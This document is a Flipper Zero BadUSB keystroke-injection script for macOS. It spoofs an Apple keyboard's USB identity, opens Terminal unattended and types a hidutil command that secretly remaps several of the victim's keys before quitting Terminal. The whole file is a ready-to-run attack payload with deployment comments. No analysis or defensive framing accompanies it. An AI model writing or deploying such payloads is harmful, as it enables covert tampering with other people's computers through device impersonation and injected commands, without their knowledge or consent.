ID 05ac:021e Apple:Keyboard     // This line must be first IF (and only if), it is the first time ever that a bad-usb (or bad-bluetooth) attack has been launched on THIS specific macOS with THIS specific FlipperZero, as it serves to identify it as an original Apple keyboard. The following times (or if Flipper Zero has already been identified by this macOS) this line will be deleted before executing the attack.
REM Author: 47LeCoste
REM Version 1.0 (Flipper Ducky)
REM Target: macOS
DELAY 3000
GUI SPACE
DELAY 500
STRING Terminal.app
DELAY 200
ENTER
DELAY 1000
STRING hidutil property --set '{"UserKeyMapping":[{"HIDKeyboardModifierMappingSrc": 0x700000004,"HIDKeyboardModifierMappingDst": 0x700000022},{"HIDKeyboardModifierMappingSrc": 0x700000040,"HIDKeyboardModifierMappingDst": 0x700000005},{"HIDKeyboardModifierMappingSrc": 0x700000023,"HIDKeyboardModifierMappingDst": 0x700000006},{"HIDKeyboardModifierMappingSrc": 0x700000024,"HIDKeyboardModifierMappingDst": 0x700000007},{"HIDKeyboardModifierMappingSrc": 0x700000025,"HIDKeyboardModifierMappingDst": 0x700000008},{"HIDKeyboardModifierMappingSrc": 0x700000026,"HIDKeyboardModifierMappingDst": 0x700000009},{"HIDKeyboardModifierMappingSrc": 0x700000027,"HIDKeyboardModifierMappingDst": 0x700000010}]}'
DELAY 5500
ENTER
DELAY 1000
GUI q     // Remember: if you gonna change the key "q-Q" this command will not work.
